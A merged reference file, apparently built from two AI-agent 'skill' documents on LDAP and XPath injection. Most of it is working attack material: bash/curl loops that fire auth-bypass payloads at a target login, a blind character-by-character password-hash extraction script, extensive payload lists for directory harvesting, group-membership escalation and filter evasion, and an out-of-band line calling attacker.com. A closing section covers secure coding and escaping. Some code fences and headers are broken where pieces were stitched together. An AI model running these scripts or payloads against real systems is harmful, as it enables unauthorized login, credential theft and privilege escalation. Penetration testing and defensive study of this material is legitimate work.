# MERGED SOURCE KNOWLEDGE: ldap-injection

58 unique sections from 2 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/hunt-ldap/SKILL.md

# HUNT-LDAP — LDAP Injection & XPath Injection

> Grounding note: LDAP injection is rarely disclosed with verbatim payloads on
> public platforms (most live on internal-pentest reports). This skill is
> grounded in the **OWASP LDAP Injection Prevention / Testing Guide
> (WSTG-INPV-06)**, **PortSwigger Web Security Academy (LDAP injection)**, and
> the **RFC 4515** filter grammar — all publicly verifiable references rather
> than invented HackerOne IDs. Do not cite a report you cannot link.

## Crown Jewel Targets

LDAP injection that bypasses authentication = **Critical**. Blind attribute
exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.

**Highest-value chains:**
- **LDAP auth bypass** — close the `uid` filter and append an always-true OR so the
  bind/search returns the admin entry without a valid password.
- **Blind attribute exfil** — char-by-char extraction of an attribute value via a
  boolean oracle (login success/failure, result count, or response length).
- **userPassword hash exfil (non-AD only)** — on OpenLDAP/389-DS the
  `userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable
  by query. See the AD-vs-generic warning below.
- **XPath injection auth bypass** — `' or '1'='1` against XML-backed auth.

---

## CRITICAL — Active Directory vs generic LDAP

Do **not** conflate the two. They behave very differently:

| | Generic LDAP (OpenLDAP, 389-DS, ApacheDS) | Active Directory |
|---|---|---|
| Password attribute | `userPassword` — may hold `{SSHA}`/`{MD5}`/`{CRYPT}` and **is readable** if ACL allows | `unicodePwd` — **write-only**, never returned by any search |
| Hash exfil via injection | **Possible** where ACLs leak `userPassword` | **Not possible** — there is no readable hash attribute over LDAP |
| Useful enum attrs | `uid`, `cn`, `mail`, `userPassword` | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description` (often holds plaintext secrets!) |

**Do not tell a reader that blind LDAP injection yields AD password hashes — it
does not.** `unicodePwd` is write-only. Against AD, the win is enumeration
(`sAMAccountName`, `memberOf`, `description`/`info` fields that admins misuse to
store passwords) and auth bypass — not hash dumping. The hash-exfil technique
applies **only** to non-AD directories exposing `userPassword`.

---

## Attack Surface Signals

```
Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)
Windows + IIS + "integrated" directory auth
/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=
"Find a colleague" / org-chart / employee-search features
XML-backed config or auth → XPath injection candidate
Error strings that confirm an LDAP backend:
  javax.naming.NameNotFoundException
  javax.naming.directory.InvalidSearchFilterException
  LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)
  com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():
  "Bad search filter"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN
```

---

## LDAP filter grammar (RFC 4515) — why injection works

A login filter is typically built by string-concat:

```
(&(uid=<USERNAME>)(userPassword=<PASSWORD>))
```

`&` = AND, `|` = OR, `!` = NOT. **Filters are prefix/Polish notation** — the
operator comes first and every sub-filter is parenthesised. To inject you must
(a) escape the current `(uid=...)` group, (b) inject your own logic, and
(c) leave the overall parenthesis count **balanced** or the server throws a
filter-syntax error instead of executing.

### The special-character set — TEST EACH ONE

These characters are syntactically meaningful and MUST be escaped by a safe app
(RFC 4515 §3). If the app reflects an error or behaves differently when you send
them raw, the input is unescaped → injectable:

| Char | Filter escape | Why it matters |
|------|---------------|----------------|
| `*`  | `\2a` | wildcard — matches any value |
| `(`  | `\28` | opens a filter group |
| `)`  | `\29` | closes a filter group |
| `\`  | `\5c` | escape char itself |
| NUL  | `\00` | string terminator — truncates filter in C-backed servers |
| `/`  | (DN context) | RDN separator — relevant for DN injection |

**Search-filter context vs DN injection** are different bugs:
- **Search-filter injection** (most common): your input lands inside a
  `(attr=VALUE)` filter. Payloads use `* ( ) & | !`.
- **DN injection**: your input is concatenated into a Distinguished Name
  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and `/`
  matter, and a `*` is NOT a wildcard. Test both — the payloads do not transfer.

---

# ALWAYS capture a control response first — you compare everything to this.
BASE=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
  -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"validlookinguser","password":"wrongpass"}')
echo "BASELINE (valid-format, wrong pw): $BASE"

# An INJECTABLE app → 500 / filter-syntax error / different size.
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test)","password":"x"}' | grep -iE \
  "naming|InvalidSearchFilter|error code 49|Bad search filter|jndi|ldap_search"
```

A lone `)` that produces a syntax error/500 while a balanced payload does not is
the cleanest LDAP-injection tell — note it, you will need it as proof.

# Wildcard-everything (works when password clause is dropped by a trailing comment-like break):

#   username = admin)(uid=*))%00      password = x

USERNAME_PAYLOADS=(
  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
  'admin*'                 # simple wildcard suffix — try first, lowest noise
)

for P in "${USERNAME_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
  echo "PAYLOAD: $P"
  echo "RESP:    ${R: -40}"
  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
  echo "---"
done
```

**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
full filter, not just your payload. If the app appends `)(userPassword=...))`
after your input, leave the right number of trailing `)` so the final string is
balanced. An unbalanced filter = syntax error = NOT a bypass (false positive).

### Phase 3 — Blind exfil with a CONTROLLED oracle (not raw byte-count)

Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,
length-jitter on the injected char itself). Use a **paired true/false control**
so the oracle is the *response*, not the absolute size.

```bash

# FALSE: admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ
probe () {  # $1 = filter-tail payload -> prints normalized size
  curl -s -o /dev/null -w "%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$1\",\"password\":\"x\"}"
}
T=$(probe 'admin)(uid=*))(|(uid=*')
F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')
echo "TRUE-class size=$T  FALSE-class size=$F"
[ "$T" = "$F" ] && { echo "No length oracle — try a STATUS or BODY-MARKER oracle, or OOB."; exit; }

# Now extract char-by-char. The boolean test compares against $T/$F, NOT a guess.

# Filter: (&(uid=admin)(userPassword=<PREFIX><CHAR>*))  on a NON-AD directory.
PREFIX=""
for pos in $(seq 1 32); do
  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
  done
done
echo "RECOVERED: $PREFIX"
```

False-positive guards for blind exfil:
- **Repeat each positive char 3x** and confirm the size is stable — length-jitter
  from the attacker-controlled char itself is the #1 false positive.
- Confirm the **FALSE control still returns the FALSE size** after each round (the
  app didn't just start erroring on every request — WAF block looks like a match).
- If body length is unreliable, switch the oracle to **HTTP status**, a **body
  marker string** (`"Invalid credentials"` present/absent), or **timing** with a
  heavy filter — but only after establishing a stable baseline delta.

# Bypass closes the name predicate and OR-trues the whole expression.
XPATH_PAYLOADS=(
  "' or '1'='1"
  "' or ''='"
  "admin' or '1'='1' or 'a'='b"     # keeps quoting balanced
  "x'] | //user/* | //user[name()='x"  # blind: dump all user nodes (XPath has no comments)
  "*[contains(name(),'pass')]"          # node-name discovery
)
for P in "${XPATH_PAYLOADS[@]}"; do
  E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    --data-urlencode "username=$P" --data-urlencode "password=x")
  echo "$P  ->  ${R: -24}"
done

# XPath has NO comment syntax — you must keep quotes/brackets balanced, unlike SQLi.
```

# Establish that prefix='zzqx' (unlikely) returns ~0 and prefix='a' returns more.

# A directory that returns the SAME count for both is NOT leaking via wildcard.
count () { curl -s -X POST https://$TARGET/api/directory/search \
  -H "Content-Type: application/json" -d "{\"filter\":\"(sAMAccountName=$1*)\"}" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("results",d.get("users",[]))))' 2>/dev/null; }
CTRL=$(count "zzqx_unlikely")
echo "control count (should be ~0): $CTRL"
for L in {a..z}; do echo "$L* -> $(count $L)  (vs control $CTRL)"; done

# Validate the inferred filter directly if you ever get LDAP creds / a bind:
ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" sAMAccountName memberOf

## Chain Table

| LDAP finding | Chain to | Impact |
|--------------|----------|--------|
| Auth-bypass (always-true filter) | Admin/SSO panel as first directory entry | Critical |
| AD enumeration (`sAMAccountName`) | Username list → password spray / credential stuffing | Mass-ATO risk |
| `memberOf` enumeration | Identify Domain Admins → targeted phishing/spray | Targeted compromise |
| `description`/`info` field read | Plaintext creds admins stashed there | Direct credential leak |
| Blind exfil of `userPassword` **(non-AD only)** | `{SSHA}` (salted SHA-1) → hashcat `-m 111` (`{SSHA256}`=1411, `{SSHA512}`=1711); `{CRYPT}` → mode depends on the `$id$` prefix (`$1$`=500, `$6$`=1800) → offline crack | High |
| LDAP referral → Collaborator | Server-side request / internal directory reach | SSRF-class, confirms blind |

> AD has no readable password attribute — do not list "extract AD hashes" as a
> chain. Against AD, the credential win comes from `description`/`info` misuse or
> from enumerated usernames feeding a spray, never from `unicodePwd`.

---

## Validation — rule out the false positive BEFORE you report

A "bypass" or "match" is only real once you have eliminated syntax-error,
WAF-block, and length-jitter explanations.

- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
      session** (session cookie + access to a post-login resource), and the same
      request with one paren removed returns a **filter-syntax error** — proving
      the filter parsed and executed, not that the app fell open on every input.
- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
      true-class and false-class "succeed", you found a broken endpoint, not LDAP
      injection.
- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
      FALSE control still reads FALSE between rounds; recovered value verified by
      a direct lookup or by the auth-bypass payload that uses it.
- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
      in to a real account context — not just a different error page.
- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
      payload is decisive for blind cases — prefer it over length-only inference.
- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.

**Severity:**
- Auth bypass landing as admin/privileged directory entry: **Critical**
- `userPassword` hash exfil (non-AD) or `description`-field credential read: **High**
- AD user/group enumeration only: **Medium-High**
- Blind boolean oracle confirmed but no useful attribute reachable: **Medium**


## SOURCE: normal-skills/ldap.md

## Overview

LDAP Injection is an attack technique used to exploit web applications that construct LDAP (Lightweight Directory Access Protocol) statements from user-supplied input. When an application fails to properly sanitize input, malicious LDAP filters can be injected to bypass authentication, enumerate directory contents, modify directory objects, or escalate privileges.

**LDAP Query Structure Context:**
- **DN (Distinguished Name):** `cn=John,ou=Users,dc=example,dc=com`
- **Filter Syntax:** `(&(attribute=value)(attribute2=value2))`
- **Operators:** `&` (AND), `|` (OR), `!` (NOT), `*` (wildcard), `=` (equality)

---

### 1.1 Error-Based Detection

Inject syntax-breaking payloads to trigger LDAP parser errors:

**Basic Syntax Probes:**
```
*
*)(
*))(((
(&
(|)
!
)(
)(
)(
```

**Error Signatures to Monitor:**
- `LDAPException` / `javax.naming.NamingException`
- `Invalid DN syntax` / `Bad search filter`
- `LDAP: error code 21` (Invalid attribute syntax)
- `LDAP: error code 32` (No such object)
- `LDAP: error code 34` (Invalid DN syntax)
- `Size limit exceeded`
- `Time limit exceeded`

**HTTP Response Indicators:**
- Status code changes (500 → 200 or vice versa)
- Response time anomalies (LDAP timeouts vs. quick errors)
- Stack traces revealing LDAP SDK (Spring LDAP, UnboundID, Novell)

### 1.2 Boolean-Based Detection

Use logically true/false conditions to infer injection:

**AND-Based Tests (True Condition):**
```
 legitimate)(cn=*))(&(cn=*
 legitimate))(&(cn=*
 legitimate*))(&(cn=*
```

**OR-Based Tests (True Condition):**
```
 *)(cn=*))(|(cn=*
 *)(objectClass=*))(|(objectClass=*
```

**Time-Differential Detection:**
```
 *)(objectClass=*)(|(objectClass=*))(&(|(objectClass=*
```

### 1.3 LDAP Server Fingerprinting

Determine backend type to tailor payloads:

| Indicator | Server Type |
|-----------|-------------|
| `objectClass=top` | OpenLDAP |
| `objectClass=organizationalPerson` | Active Directory |
| `sAMAccountName` attribute | Active Directory |
| `uid` attribute | OpenLDAP/389 DS |
| `cn` common naming | Generic LDAP |
| `distinguishedName` attribute | Active Directory |

**Fingerprinting Payloads:**
```
(objectClass=*)
(objectClass=top)
(objectClass=organizationalUnit)
(objectClass=domain)
(objectClass=posixAccount)
```

---

### 2.1 Classic Authentication Bypass

**Standard Login Form Structure:**
```
(&(uid=INPUT)(password=INPUT))
```

**Universal True Condition (AND Injection):**
```
*)(uid=*))(&(uid=*
```
**Resulting Query:** `(&(uid=*)(uid=*))(&(uid=*)(password=anything))` → Always true

**Payload Variants:**
```
*)(uid=*))(&(uid=*
*)(uid=*))(&(uid=*)(password=*
*)(uid=*))(&(uid=*)(|(password=*
*)(objectClass=*))(&(objectClass=*
*)(objectClass=top))(&(objectClass=*
*)(cn=admin))(&(cn=admin)(password=*
*)(cn=administrator))(&(cn=administrator)(password=*
*)(sAMAccountName=*))(&(sAMAccountName=*)(password=*
*)(userPrincipalName=*))(&(userPrincipalName=*)(password=*
*)(mail=*@domain.com))(&(mail=*@domain.com)(password=*
```

**Active Directory Specific:**
```
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*))(&(userPrincipalName=*
*)(cn=Domain Admins))(&(cn=Domain Admins)(member=*
*)(memberOf=CN=Domain Admins*))(&(memberOf=CN=Domain Admins*)(password=*
```

### 2.2 Wildcard Injection Techniques

**Password Field Wildcard Injection:**
```
*
*))
*)(objectClass=*
*)(cn=*
*)(uid=*
*)(mail=*
```

**DN Component Wildcard Injection:**
```
cn=*,dc=example,dc=com
uid=*,ou=Users,dc=example,dc=com
*,ou=Users,dc=example,dc=com
*\\*,dc=example,dc=com
```

### 2.3 Logical Operator Manipulation

**OR Injection for Universal Match:**
```
)(|(uid=*
)(|(objectClass=*
)(|(cn=*
)(|(mail=*
)(|(sAMAccountName=*
```

**NOT Operator Bypass:**
```
)(!(uid=nonexistent))(&(uid=*
)(!(objectClass=nonexistent))(&(objectClass=*
```

**Nested Boolean Injection:**
```
)(|(uid=*))(&(uid=*
)(|(objectClass=*))(&(objectClass=*
)(|(cn=*))(&(cn=*
)(|(mail=*))(&(mail=*
```

### 2.4 Comment/Null Byte Truncation

**Null Byte Injection (if supported):**
```
admin%00
*)(uid=admin%00
*)(uid=*%00
```

**Comment Injection (LDAPv3 extensible match):**
```
*)(uid=admin)/* 
*)(uid=*)/* 
```

---

### 3.1 DN Escape & Context Switching

**Base DN Traversal:**
```
dc=com
dc=example,dc=com
ou=Users,dc=example,dc=com
cn=admin,ou=Users,dc=example,dc=com
```

**Relative DN Injection:**
```
..\\,ou=Groups,dc=example,dc=com
..,ou=Groups,dc=example,dc=com
\\,ou=Administrators,dc=example,dc=com
```

**DN Component Injection:**
```
cn=admin,ou=Users,dc=example,dc=com
uid=admin,ou=Users,dc=example,dc=com
sAMAccountName=admin,dc=example,dc=com
```

### 3.2 Organizational Unit (OU) Traversal

**OU Enumeration via DN Manipulation:**
```
*)(ou=*)
*)(ou=*))(&(ou=*
*)(objectClass=organizationalUnit)
*)(objectClass=container)
*)(objectClass=domainDNS)
```

**Parent Domain Traversal:**
```
dc=*
dc=*)(dc=*
dc=*))(&(dc=*
```

### 3.3 Active Directory Specific Traversal

**Domain Controller Enumeration:**
```
*)(objectClass=domainDNS)
*)(objectClass=domain)
*)(nCName=*)
*)(distinguishedName=DC=*
```

**Forest/Tree Traversal:**
```
*)(objectClass=trustedDomain)
*)(trustParent=*)
*)(objectClass=crossRef)
```

---

### 4.1 Search Filter Expansion

**Universal Object Retrieval:**
```
*)(objectClass=*)
*)(objectClass=top)
*)(objectClass=organizationalPerson)
*)(objectClass=person)
*)(objectClass=user)
*)(objectClass=posixAccount)
*)(objectClass=inetOrgPerson)
```

**Attribute-Specific Enumeration:**
```
*)(uid=*)
*)(cn=*)
*)(mail=*)
*)(telephoneNumber=*)
*)(givenName=*)
*)(sn=*)
*)(employeeNumber=*)
*)(departmentNumber=*)
*)(title=*)
*)(l=*)
*)(st=*)
*)(c=*)
```

### 4.2 Active Directory Attribute Harvesting

**Critical AD Attributes:**
```
*)(sAMAccountName=*)
*)(userPrincipalName=*)
*)(displayName=*)
*)(givenName=*)
*)(sn=*)
*)(mail=*)
*)(telephoneNumber=*)
*)(homePhone=*)
*)(mobile=*)
*)(pager=*)
*)(facsimileTelephoneNumber=*)
*)(streetAddress=*)
*)(l=*)
*)(st=*)
*)(postalCode=*)
*)(c=*)
*)(co=*)
*)(department=*)
*)(company=*)
*)(title=*)
*)(description=*)
*)(manager=*)
*)(directReports=*)
*)(memberOf=*)
*)(primaryGroupID=*)
*)(userAccountControl=*)
*)(pwdLastSet=*)
*)(lastLogon=*)
*)(lastLogonTimestamp=*)
*)(accountExpires=*)
*)(logonCount=*)
*)(badPwdCount=*)
*)(badPasswordTime=*)
*)(objectSid=*)
*)(sidHistory=*)
```

**Credential-Related Attributes:**
```
*)(userPassword=*)
*)(unicodePwd=*)
*)(unixUserPassword=*)
*)(authPassword=*)
*)( krbPrincipalName=*)
*)(krb5Key=*)
```

### 4.3 Bulk User Enumeration

**User Object Retrieval:**
```
(&(objectClass=user)(objectCategory=person))
(&(objectClass=organizationalPerson)(objectClass=person))
(&(objectClass=inetOrgPerson)(uid=*))
(&(objectClass=posixAccount)(uid=*))
```

**Group Membership Enumeration:**
```
(&(objectClass=group)(member=*))
(&(objectClass=groupOfNames)(member=*))
(&(objectClass=groupOfUniqueNames)(uniqueMember=*))
(&(objectClass=posixGroup)(memberUid=*))
```

**Nested Group Resolution:**
```
(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=*))
(&(objectClass=group)(memberOf:1.2.840.113556.1.4.1941:=*))
```

---

### 5.1 Extensible Match Injection

**LDAPv3 Extensible Match Syntax:**
```
(attr:rule:=value)
(attr:dn:rule:=value)
(attr:dn:=value)
```

**Extensible Match Payloads:**
```
*)(uid:caseExactMatch:=admin)
*)(uid:dn:caseExactMatch:=admin)
*)(userPassword:2.16.840.1.113730.3.3.2.1.1:=*
*)(member:dn:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=example,DC=com)
```

### 5.2 Attribute Existence Testing

**Presence Testing for Reconnaissance:**
```
*)(attributeName=*)
*)(attributeName=*)(&(attributeName=*
```

**Attribute Existence Enumeration:**
```
*)(objectClass=*)(attribute1=*)
*)(objectClass=*)(attribute1=*)(attribute2=*)
*)(objectClass=*)(attribute1=*)(attribute2=*)(attribute3=*)
```

### 5.3 Substring & Range Attacks

**Substring Search Injection:**
```
a*
ab*
abc*
abcd*
```

**Range Retrieval (AD-specific):**
```
*)(member;range=0-1499=*)
*)(member;range=1500-2999=*)
*)(member;range=3000-4499=*)
```

**Incremental Character Enumeration:**
```
a*)(cn=a*
b*)(cn=b*
c*)(cn=c*
...
0*)(cn=0*
1*)(cn=1*
```

---

### 6.1 Boolean-Based Blind Extraction

**Character Enumeration Payload:**
```
*)(cn=admin))(&(cn=a*
*)(cn=admin))(&(cn=b*
*)(cn=admin))(&(cn=c*
...
*)(cn=admin))(&(cn=admin*
*)(cn=admin))(&(cn=admia*
*)(cn=admin))(&(cn=admib*
```

**Binary Search Optimization:**
```
*)(cn>=m))(&(cn>=m*
*)(cn>=g))(&(cn>=g*
*)(cn>=j))(&(cn>=j*
```

### 6.2 Time-Based Blind Injection

**Server-Side Sleep Injection (if supported):**
```
*)(|(objectClass=*)(delay=5000))
*)(objectClass=*)(|(objectClass=*)(wait=5))
```

**Resource Exhaustion Timing:**
```
*)(objectClass=*)(|(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*)(objectClass=*))
```

**Active Directory Specific Delays:**
```
*)(objectClass=*)(|(objectClass=*)(!(objectClass=nonexistent)))
*)(objectClass=*)(|(objectClass=*)(|(objectClass=*)(objectClass=*)))
```

### 6.3 Out-of-Band (OOB) Exfiltration

**DNS Exfiltration (if LDAP URL resolution):**
```
*)(objectClass=*)(|(objectClass=*)(ldap://attacker.com/dc=example,dc=com))
*)(objectClass=*)(|(objectClass=*)(ldaps://attacker.com:636/))
```

---

### 7.1 Group Membership Injection

**Add Self to Group (if write access):**
```
)(member=CN=Attacker,OU=Users,DC=example,DC=com))(&(member=*
)(uniqueMember=uid=attacker,ou=users,dc=example,dc=com))(&(uniqueMember=*
```

**Administrative Group Targeting:**
```
)(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com))(&(memberOf=*
)(memberOf=CN=Enterprise Admins,CN=Users,DC=example,DC=com))(&(memberOf=*
)(memberOf=CN=Schema Admins,CN=Users,DC=example,DC=com))(&(memberOf=*
)(memberOf=CN=Administrators,CN=Builtin,DC=example,DC=com))(&(memberOf=*
```

### 7.2 Password Reset Injection

**Password Change Filter Injection:**
```
)(unicodePwd:=newpassword))(&(unicodePwd=*
)(userPassword:=newpassword))(&(userPassword=*
```

### 7.3 Account Manipulation

**Enable/Disable Account (userAccountControl):**
```
)(userAccountControl:=512))(&(userAccountControl=*
)(userAccountControl:=66048))(&(userAccountControl=*
```

---

### 8.1 Encoding Techniques

**URL Encoding:**
```
%2a)(uid=%2a))(%26(uid=%2a
%2a)(objectClass=%2a))(%26(objectClass=%2a
```

**Double URL Encoding:**
```
%252a)(uid=%252a))(%2526(uid=%252a
```

**Unicode Normalization:**
```
%u002a)(uid=%u002a))(%u0026(uid=%u002a
```

### 8.2 Case Variation

**Mixed Case Obfuscation:**
```
*)(Uid=*))(&(Uid=*
*)(ObJeCtClAsS=*))(&(ObJeCtClAsS=*
*)(sAmAcCoUnTnAmE=*))(&(sAmAcCoUnTnAmE=*
```

### 8.3 Whitespace Substitution

**Whitespace Alternatives:**
```
*)(uid=*))(&(uid=*
*)(uid=%09*))(&(uid=%09*
*)(uid=%0a*))(&(uid=%0a*
*)(uid=%0d*))(&(uid=%0d*
*)(uid=%0b*))(&(uid=%0b*
*)(uid=%0c*))(&(uid=%0c*
*)(uid=%a0*))(&(uid=%a0*
```

### 8.4 Comment Injection

**LDAP Comments (if parser supports):**
```
*)(uid=admin)/*comment*/))(&(uid=*
*)(objectClass=*)/*comment*/))(&(objectClass=*
```

---

### 9.1 Login Form Variants

**Username-Only Field:**
```
*)(uid=*))(&(uid=*
*)(cn=*))(&(cn=*
*)(mail=*))(&(mail=*
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*))(&(userPrincipalName=*
```

**Password-Only Field (if used in filter):**
```
*)(password=*))(&(password=*
*)(userPassword=*))(&(userPassword=*
```

**Both Fields Injection:**
```
Username: *)(uid=*))(&(uid=*
Password: *)
```

### 9.2 Search/Directory Interface

**Search Filter Injection:**
```
*)(objectClass=*)
*)(uid=*)
*)(cn=*)
*)(mail=*)
*)(telephoneNumber=*)
*)(givenName=*)
*)(sn=*)
```

**Advanced Search Operators:**
```
(&(objectClass=user)(|(cn=*)(sn=*)(mail=*)(telephoneNumber=*)))
(&(objectClass=group)(|(cn=*)(description=*)))
(&(objectClass=organizationalUnit)(|(ou=*)(description=*)))
```

### 9.3 Password Reset Interface

**Identity Verification Bypass:**
```
*)(uid=*))(&(uid=*
*)(mail=*))(&(mail=*
*)(employeeNumber=*))(&(employeeNumber=*
*)(cn=*))(&(cn=*
```

---

### 10.1 Fuzzing Payload Lists

**Minimal High-Impact Set:**
```
*
*)(uid=*
*)(cn=*
*)(objectClass=*
*)(objectClass=top
*)(objectClass=person
*)(objectClass=organizationalPerson
*)(uid=*))(&(uid=*
*)(cn=*))(&(cn=*
*)(objectClass=*))(&(objectClass=*
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*))(&(userPrincipalName=*
*)(mail=*))(&(mail=*
*)(memberOf=*))(&(memberOf=*
```

**Comprehensive Fuzzing List:**
```
*)(uid=*)
*)(uid=*))(&(uid=*
*)(uid=*))(&(uid=*)(password=*
*)(cn=*)
*)(cn=*))(&(cn=*
*)(cn=*))(&(cn=*)(password=*
*)(objectClass=*)
*)(objectClass=*))(&(objectClass=*
*)(objectClass=top)
*)(objectClass=top))(&(objectClass=top
*)(objectClass=person)
*)(objectClass=organizationalPerson)
*)(objectClass=inetOrgPerson)
*)(objectClass=user)
*)(objectClass=group)
*)(objectClass=domain)
*)(objectClass=domainDNS)
*)(sAMAccountName=*)
*)(sAMAccountName=*))(&(sAMAccountName=*
*)(userPrincipalName=*)
*)(userPrincipalName=*))(&(userPrincipalName=*
*)(mail=*)
*)(mail=*))(&(mail=*
*)(telephoneNumber=*)
*)(givenName=*)
*)(sn=*)
*)(employeeNumber=*)
*)(title=*)
*)(department=*)
*)(company=*)
*)(manager=*)
*)(memberOf=*)
*)(member=*)
*)(userAccountControl=*)
*)(objectSid=*)
*)(distinguishedName=*)
*)(name=*)
*)(displayName=*)
*)(description=*)
*)(homeDirectory=*)
*)(scriptPath=*)
*)(profilePath=*)
*)(userWorkstations=*)
*)(logonHours=*)
*)(primaryGroupID=*)
*)(groupType=*)
*)(adminCount=*)
*)(instanceType=*)
*)(whenCreated=*)
*)(whenChanged=*)
*)(pwdLastSet=*)
*)(lastLogon=*)
*)(lastLogonTimestamp=*)
*)(accountExpires=*)
*)(logonCount=*)
*)(badPwdCount=*)
*)(badPasswordTime=*)
*)(lockoutTime=*)
```

### 10.2 Response Analysis Patterns

**True Condition Indicators:**
- Successful authentication
- Search results returned
- Profile page displayed
- Redirect to dashboard
- Status 200 with content
- Response time < baseline

**False Condition Indicators:**
- Authentication failure
- Empty search results
- Error page displayed
- Redirect to login
- Status 401/403
- Response time > baseline (potential blind)

---

### 11.1 Secure Coding Patterns

**Parameterized LDAP Queries (Java/JNDI):**
```java
// VULNERABLE
String filter = "(uid=" + userInput + ")";
NamingEnumeration results = ctx.search(baseDN, filter, null);

// SECURE
String filter = "(uid={0})";
Object[] args = new Object[]{userInput};
NamingEnumeration results = ctx.search(baseDN, filter, args, null);
```

**Parameterized LDAP Queries (Python/ldap3):**
```python

# SECURE
conn.search('dc=example,dc=com', '(uid=%s)', parameters=[user_input])
```

**Input Validation (Whitelist Approach):**
```python
import re
def validate_ldap_input(input_string):
    # Allow only alphanumeric and specific safe characters
    if not re.match(r'^[a-zA-Z0-9._@-]+$', input_string):
        raise ValueError("Invalid LDAP input")
    return input_string
```

**DN Escape Function:**
```python
def escape_ldap_dn(dn_component):
    escape_chars = {
        '\\': '\\\\',
        ',': '\\,',
        '+': '\\+',
        '"': '\\"',
        '<': '\\<',
        '>': '\\>',
        ';': '\\;',
        '=': '\\=',
        '\x00': '\\00',
        '\n': '\\0a',
        '\r': '\\0d'
    }
    for char, replacement in escape_chars.items():
        dn_component = dn_component.replace(char, replacement)
    return dn_component
```

**Filter Escape Function:**
```python
def escape_ldap_filter(filter_input):
    escape_chars = {
        '\\': '\\\\',
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\x00': '\\00',
        '/': '\\2f'
    }
    for char, replacement in escape_chars.items():
        filter_input = filter_input.replace(char, replacement)
    return filter_input
```

### 11.2 Defense Layers

1. **Input Validation:** Whitelist allowed characters (alphanumeric, limited punctuation)
2. **Parameterization:** Use LDAP bind variables and prepared statements
3. **Escaping:** Properly escape special LDAP characters (`*`, `(`, `)`, `\`, `\0`)
4. **Least Privilege:** Run LDAP queries with read-only, limited-scope credentials
5. **Output Encoding:** Encode LDAP query results before display
6. **Error Handling:** Generic error messages, no LDAP error details exposed
7. **Logging:** Log all LDAP queries with parameters for audit

---

## Quick Reference: Payload Matrix

| Target | Payload | Expected Result |
|--------|---------|-----------------|
| Auth Bypass (AND) | `*)(uid=*))(&(uid=*` | Universal match |
| Auth Bypass (OR) | `)(|(uid=*` | Universal match |
| Wildcard Pass | `*` | Match any password |
| User Enum | `*)(objectClass=user)` | All user objects |
| Group Enum | `*)(objectClass=group)` | All group objects |
| AD Specific | `*)(sAMAccountName=*)` | All AD accounts |
| DN Traversal | `*,dc=example,dc=com` | Root DN listing |
| Attribute Harvest | `*)(mail=*)(cn=*)(sn=*)` | Multi-attribute dump |
| Blind True | `*)(cn=a*` | Conditional response |
| Blind False | `*)(cn=zzz*` | No response |

---

## Testing Checklist

- [ ] Detect LDAP injection points (login, search, password reset)
- [ ] Fingerprint LDAP server type (OpenLDAP, AD, 389 DS)
- [ ] Test authentication bypass with wildcard injection
- [ ] Test authentication bypass with logical operator injection
- [ ] Test directory traversal via DN manipulation
- [ ] Enumerate directory schema and attributes
- [ ] Extract bulk user/group listings
- [ ] Test for blind LDAP injection (boolean/time-based)
- [ ] Attempt privilege escalation via group membership
- [ ] Test WAF/filter evasion techniques
- [ ] Verify input sanitization and parameterization
- [ ] Document all findings with proof-of-concept
```
